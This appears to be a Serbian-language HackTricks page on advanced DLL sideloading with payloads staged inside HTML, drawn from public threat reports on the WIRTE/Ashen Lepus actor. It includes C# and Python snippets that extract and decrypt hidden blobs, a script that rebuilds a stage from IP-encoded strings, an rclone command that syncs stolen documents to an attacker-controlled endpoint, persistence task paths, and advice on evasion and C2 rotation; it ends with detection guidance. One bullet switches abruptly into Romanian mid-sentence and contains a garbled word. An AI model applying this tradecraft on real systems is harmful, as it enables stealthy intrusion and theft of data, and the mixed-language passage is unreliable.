# Napredno DLL sideloading sa insceniranjem payload-a ugrađenih u HTML

{{#include ../../../banners/hacktricks-training.md}}

## Pregled tradecraft-a

Ashen Lepus (poznat i kao WIRTE) prilagodio je ponovljiv obrazac koji povezuje DLL sideloading, inscenirane HTML payload-e i modularna .NET backdoor rešenja radi opstanka unutar diplomatskih mreža Bliskog istoka. Ovu tehniku može ponovo da upotrebi bilo koji operater, jer se oslanja na:<sup>[[1]](#references)</sup>

- **Društveni inženjering zasnovan na arhivama**: bezazleni PDF-ovi upućuju mete da preuzmu RAR arhivu sa sajta za deljenje datoteka. Arhiva sadrži EXE koji izgleda kao pravi pregledač dokumenata, zlonamerni DLL nazvan po pouzdanoj biblioteci (npr. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) i lažni `Document.pdf`.
- **Zloupotreba redosleda pretrage DLL-ova**: žrtva dvaput klikne na EXE, Windows učitava DLL import iz trenutnog direktorijuma, a zlonamerni loader (AshenLoader) izvršava se unutar pouzdanog procesa dok se lažni PDF otvara kako bi se izbegla sumnja.
- **Insceniranje pomoću alata koji su već prisutni na sistemu**: svaka naredna faza (AshenStager → AshenOrchestrator → moduli) ostaje van diska dok ne zatreba, a isporučuje se kao šifrovani blob sakriven u inače bezazlenim HTML odgovorima.

## Višefazni lanac sideloading-a

1. **Lažni EXE → AshenLoader**: EXE učitava AshenLoader putem sideloading-a; AshenLoader prikuplja podatke o hostu, šifruje ih pomoću AES-CTR-a i šalje ih POST zahtevom u promenljivim parametrima kao što su `token=`, `id=`, `q=` ili `auth=` ka putanjama koje liče na API (npr. `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Izdvajanje iz HTML-a**: C2 otkriva narednu fazu samo kada se utvrdi da se IP adresa klijenta geografski nalazi u ciljnom regionu i kada se `User-Agent` podudara sa implantom, čime se ometaju sandbox okruženja. Kada provere prođu, HTTP telo sadrži blob `<headerp>...</headerp>` sa Base64/AES-CTR šifrovanim payload-om AshenStager-a.
3. **Drugi sideload**: AshenStager se postavlja uz drugi legitimni binarni fajl koji importuje `wtsapi32.dll`. Zlonamerna kopija ubrizgana u binarni fajl preuzima dodatni HTML i ovog puta izdvaja `<article>...</article>` da bi povratila AshenOrchestrator.
4. **AshenOrchestrator**: modularni .NET kontroler koji dekodira Base64 JSON konfiguraciju. Polja `tg` i `au` iz konfiguracije spajaju se i heširaju da bi se dobio AES ključ, koji dešifruje `xrk`. Dobijeni bajtovi služe kao XOR ključ za svaki naredni preuzeti blob modula.
5. **Isporuka modula**: svaki modul opisuju HTML komentari koji parser preusmeravaju na proizvoljnu oznaku, zaobilazeći statička pravila koja proveravaju samo `<headerp>` ili `<article>`. Moduli obuhvataju persistence (`PR*`), deinstalacione programe (`UN*`), izviđanje (`SN`), snimanje ekrana (`SCT`) i istraživanje datoteka (`FE`).

### Obrazac za parsiranje HTML kontejnera

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Čak i ako branioci blokiraju ili uklone određeni element, operator treba samo da promeni tag naveden u HTML komentaru da bi nastavio isporuku.<sup>[[1]](#references)</sup>

### Brzi pomoćnik za izdvajanje (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## Paralele sa izbegavanjem detekcije pomoću HTML staginga

Nedavna istraživanja HTML smugglinga (Talos) ističu payload-e skrivene kao Base64 stringovi unutar `<script>` blokova u HTML prilozima, koji se dekodiraju pomoću JavaScripta tokom izvršavanja.<sup>[[2]](#references)</sup> Isti trik može ponovo da se upotrebi za C2 odgovore: postaviti šifrovane blobove unutar script taga (ili drugog DOM elementa) i dekodirati ih u memoriji pre AES/XOR obrade, tako da stranica izgleda kao običan HTML. Talos takođe prikazuje višeslojnu obfuskaciju (preimenovanje identifikatora uz Base64/Caesar/AES) unutar script tagova, što se lako primenjuje na C2 blobove staged u HTML-u.<sup>[[2]](#references)</sup> Kasniji Talos tekst o **hidden text salting** tehnici takođe je relevantan: razdvajanje Base64 sadržaja nebitnim HTML komentarima ili razmacima dovoljno je da zbuni jednostavne regex ekstraktore, dok rekonstrukcija u browseru ostaje trivijalna.<sup>[[7]](#references)</sup>

## Napomene o novijim varijantama (2024-2025)

- Check Point je 2024. zabeležio WIRTE kampanje koje su se i dalje oslanjale na sideloading zasnovan na arhivama, ali su koristile `propsys.dll` (stagerx64) kao prvu fazu. Stager dekodira sledeći payload pomoću Base64 + XOR (ključ `53`), šalje HTTP zahteve sa hardkodiranim `User-Agent` i izdvaja šifrovane blobove ugrađene između HTML tagova. U jednoj laენი, stage-ul a fost reconstruit dintr-o listă lungă de șiruri IP încorporate, decodate prin `RtlIpv4StringToAddressA`, apoi concatenate în octeții payloadului.<sup>[[3]](#references)</sup>
- OWN-CERT a documentat unelte WIRTE mai vechi în care dropperul side-loaded `wtsapi32.dll` proteja șirurile cu Base64 + TEA și folosea chiar numele DLL-ului ca cheie de decriptare, apoi obfusca datele de identificare a gazdei cu XOR/Base64 înainte de a le trimite către C2.<sup>[[4]](#references)</sup>

## Rekonstrukcija IP-kodiranih stage-ova

WIRTE-ova grana iz 2024. sa `propsys.dll` pokazuje da sledeći PE ne mora da bude smešten kao jedan neprekinuti HTML blob. Loader može da pohrani bajtove stage-a kao stringove u formatu dotted-quad i ponovo ih sastavi pomoću `RtlIpv4StringToAddressA`, što je obrazac blisko povezan sa Hive-ovim **IPfuscation** tradecraftom.<sup>[[3]](#references)[[5]](#references)</sup> Operativno, ovo je korisno kada akter želi da HTML stranica sadrži ono što izgleda kao bezazleni IOC-ovi ili konfiguracioni podaci, umesto očiglednog Base64 payloada.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

Ako oporavljeni bajtovi počinju sa `MZ`, verovatno ste direktno rekonstruisali sledeći PE. Ako ne, proverite da li postoji početni XOR/Base64 sloj ili mali delimiterski segmenti između adresa.

## Zamenljiva imena DLL-ova i rotacija hostova

Važno svojstvo ovog obrasca je da **backend za HTML/AES/XOR staging može ostati nepromenjen, dok se menja samo par za sideloading**. WIRTE je tokom kampanja rotirao između `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` i `propsys.dll`, što je korisno jer:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` i `wtsapi32.dll` su uobičajena imena Windows DLL-ova za koja branioci očekuju da postoje u `%System32%` / `%SysWOW64%`.
- Javni katalozi kao što je **HijackLibs** već mapiraju mnoge binarne fajlove koji će učitavati ta imena DLL-ova iz direktorijuma kopirane aplikacije, pa operatori mogu da zamene hostove bez redizajniranja stagera.
- Potrebno je prilagoditi samo export površinu za svaki host. HTML parser, AES/XOR rutine i module loader obično se mogu neizmenjeni preneti u forwarding proxy DLL.

Za rad u ofanzivnoj laboratoriji to znači da problem možete podeliti na **(1) pronalaženje stabilnog, potpisanog hosta koji lokalno razrešava izabrano ime DLL-a** i **(2) ponovnu upotrebu iste logike staged-HTML loader-a iza tog DLL-a**.

## Ojačavanje kriptografije i C2

- **AES-CTR svuda**: aktuelni loader-i sadrže 256-bitne ključeve i nonce-ove (npr. `{9a 20 51 98 ...}`), uz opciono dodavanje XOR sloja pomoću stringova kao što je `msasn1.dll` pre ili posle dešifrovanja.<sup>[[1]](#references)</sup>
- **Varijacije ključnog materijala**: raniji loader-i koristili su Base64 + TEA za zaštitu ugrađenih stringova, pri čemu je ključ za dešifrovanje izveden iz imena zlonamernog DLL-a (npr. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Razdvajanje infrastrukture + prikrivanje poddomenima**: staging serveri su razdvojeni po alatima, hostuju se na različitim ASN-ovima, a ponekad se nalaze iza poddomena koji izgledaju legitimno, tako da kompromitovanje jednog stage-a ne otkriva ostale.
- **Krijumčarenje izviđačkih podataka**: popisani podaci sada obuhvataju i sadržaj direktorijuma Program Files radi pronalaženja vrednih aplikacija i uvek se šifruju pre slanja sa hosta.
- **Rotacija URI-ja**: query parametri i REST putanje menjaju se između kampanja (`/api/v1/account?token=` → `/api/v2/account?auth=`), čime se poništavaju krhke detekcije.
- **Zaključavanje User-Agent-a + bezbedna preusmeravanja**: C2 infrastruktura odgovara samo na tačne UA stringove, a u suprotnom preusmerava na bezazlene vesti ili zdravstvene sajtove kako bi se uklopila u uobičajeni saobraćaj.
- **Ograničena isporuka**: serveri su geografski ograničeni i odgovaraju samo pravim implantima. Neodobreni klijenti dobijaju neupadljiv HTML.

## Postojanost i ciklus izvršavanja

AshenStager kreira zakazane zadatke koji se predstavljaju kao Windows poslovi održavanja i izvršavaju preko `svchost.exe`, na primer:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ovi zadaci ponovo pokreću sideloading lanac pri pokretanju sistema ili u određenim intervalima, čime AshenOrchestrator može da zahteva sveže module bez ponovnog pristupa disku.

## Korišćenje legitimnih klijenata za sinhronizaciju radi eksfiltracije

Operatori pomoću namenski napravljenog modula smeštaju diplomatska dokumenta u `C:\Users\Public` (čitljiv za sve korisnike i neupadljiv), a zatim preuzimaju legitimni binarni fajl [Rclone](https://rclone.org/) za sinhronizaciju tog direktorijuma sa skladištem koje kontroliše napadač. Unit42 navodi da je ovo prvi put da je primećeno da ovaj akter koristi Rclone za eksfiltraciju, što se uklapa u širi trend zloupotrebe legitimnih alata za sinhronizaciju radi stapanja sa uobičajenim saobraćajem:<sup>[[1]](#references)</sup>

1. **Priprema**: kopirajte/prikupite ciljne fajlove u `C:\Users\Public\{campaign}\`.
2. **Konfiguracija**: isporučite Rclone konfiguraciju koja upućuje na HTTPS endpoint pod kontrolom napadača (npr. `api.technology-system[.]com`).
3. **Sinhronizacija**: pokrenite `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` kako bi saobraćaj ličio na uobičajene cloud rezervne kopije.

Pošto se Rclone često koristi za legitimne procese pravljenja rezervnih kopija, branioci treba da se usredsrede na neuobičajena izvršavanja (novi binarni fajlovi, sumnjivi udaljeni repozitorijumi ili iznenadna sinhronizacija sadržaja iz `C:\Users\Public`).

## Tačke za detekciju

- Upozoravajte na **potpisane procese** koji neočekivano učitavaju DLL-ove iz putanja u koje korisnik može da upisuje (Procmon filteri + `Get-ProcessMitigation -Module`), naročito kada se imena DLL-ova podudaraju sa `netutils`, `srvcli`, `dwampi`, `wtsapi32` ili `propsys`.<sup>[[6]](#references)</sup>
- Pregledajte sumnjive HTTPS odgovore u potrazi za **velikim Base64 blokovima ugrađenim u neuobičajene tagove** ili omeđenim komentarima `<!-- TAG: <xyz> -->`.
- Prvo normalizujte HTML: **uklonite komentare i spojite višestruke razmake pre izdvajanja Base64 sadržaja**, jer izbegavanje detekcije pomoću skrivanja teksta može da podeli payload preko granica komentara.
- Proširite HTML pretragu na **Base64 stringove unutar `<script>` blokova** (staging u stilu HTML smuggling-a), koji se dekodiraju pomoću JavaScript-a pre AES/XOR obrade.
- Tražite ponovljene pozive funkcije **`RtlIpv4StringToAddressA`, a zatim sklapanje bafera**, naročito kada okolni stringovi predstavljaju dugačke liste IPv4 adresa, a ne stvarne mrežne ciljeve.
- Tražite **zakazane zadatke** koji pokreću `svchost.exe` sa argumentima koji nisu vezani za servise ili upućuju nazad na direktorijume dropper-a.
- Pratite **C2 preusmeravanja** koja vraćaju payload-e samo za tačne `User-Agent` stringove, a u suprotnom preusmeravaju na legitimne vesti ili zdravstvene domene.
- Nadgledajte pojavu **Rclone** binarnih fajlova izvan lokacija kojima upravlja IT, nove fajlove `rclone.conf` ili poslove sinhronizacije koji preuzimaju podatke iz staging direktorijuma kao što je `C:\Users\Public`.

## References

- [1] [Ashen Lepus, povezan sa Hamasom, cilja diplomatske subjekte na Bliskom istoku novim paketom malvera AshTag](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Skriveno između tagova: uvidi u tehnike izbegavanja detekcije u HTML smuggling-u](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Pretnjič koji je povezan sa Hamasom, WIRTE, nastavlja operacije na Bliskom istoku i prelazi na ometajuće aktivnosti](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: U potrazi za izgubljenim vremenom](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware koristi novu IPfuscation tehniku za izbegavanje detekcije](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Mogući sideloading sistemskih DLL-ova sa lokacija koje nisu sistemske](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Začinjavanje pretnji putem e-pošte skrivenim tekstom](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
